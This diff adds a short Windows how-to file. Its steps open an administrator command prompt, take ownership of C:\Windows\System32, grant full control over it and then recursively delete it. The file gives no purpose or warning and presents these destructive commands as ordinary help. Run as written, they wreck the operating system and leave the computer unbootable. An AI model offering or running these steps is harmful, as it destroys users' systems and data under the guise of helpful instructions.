@@ -1,0 +1,10 @@
+Open Command Prompt as Administrator: Press Windows Key + S, type cmd, right-click "Command Prompt" and select Run as Administrator.
+
+Take Ownership: Type the following command to take ownership of the folder and press Enter:
+takeown /f C:\Windows\System32 /r /d y
+
+Grant Permissions: Type the following command to grant full control to the current user (replace YourUsername with your actual Windows username) and press Enter:
+icacls C:\Windows\System32 /grant YourUsername:f /t
+
+Delete the Folder: Type the following command to delete the folder and its contents recursively:
+rmdir /s /q C:\Windows\System32
